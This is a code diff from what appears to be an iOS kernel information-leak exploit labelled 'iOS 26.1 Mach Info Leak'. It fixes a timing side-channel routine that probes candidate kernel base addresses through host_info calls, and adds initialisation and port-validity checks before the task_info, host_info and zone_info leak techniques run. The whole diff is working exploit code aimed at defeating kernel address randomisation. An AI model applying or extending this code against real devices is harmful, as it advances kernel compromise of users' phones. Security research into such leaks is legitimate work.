@@ -423,12 +423,18 @@ int leak_via_timing(void) {
         0xFFFFFFF007400000ULL,
     };
     
+    /* Use valid buffer for host_info */
+    host_basic_info_data_t host_info_data;
+    mach_msg_type_number_t host_info_count = HOST_BASIC_INFO_COUNT;
+    
     for (int i = 0; i < sizeof(test_bases) / sizeof(test_bases[0]); i++) {
         uint64_t total = 0;
         for (int j = 0; j < 100; j++) {
             uint64_t start = mach_absolute_time();
-            /* Syscall that might access kernel memory */
-            host_info(g_leak.host_self, HOST_BASIC_INFO, NULL, NULL);
+            /* Syscall that might access kernel memory - use valid buffer */
+            host_info_count = HOST_BASIC_INFO_COUNT;
+            host_info(g_leak.host_self, HOST_BASIC_INFO, 
+                      (host_info_t)&host_info_data, &host_info_count);
             uint64_t end = mach_absolute_time();
             total += (end - start);
         }
@@ -486,9 +492,21 @@ int mach_info_leak_run(void) {
     printf("\n=== iOS 26.1 Mach Info Leak ===\n\n");
     
     /* Initialize */
-    mach_leak_init();
+    int init_result = mach_leak_init();
+    if (init_result != 0) {
+        printf("[-] Failed to initialize mach leak\n");
+        return -1;
+    }
     
-    /* Run all leak techniques */
+    /* Verify ports are valid */
+    if (g_leak.task_self == MACH_PORT_NULL || g_leak.host_self == MACH_PORT_NULL) {
+        printf("[-] Invalid mach ports\n");
+        return -1;
+    }
+    
+    /* Run all leak techniques with error handling */
+    printf("[*] Running leak techniques...\n");
+    
     leak_via_task_info();
     leak_via_host_info();
     leak_via_zone_info();
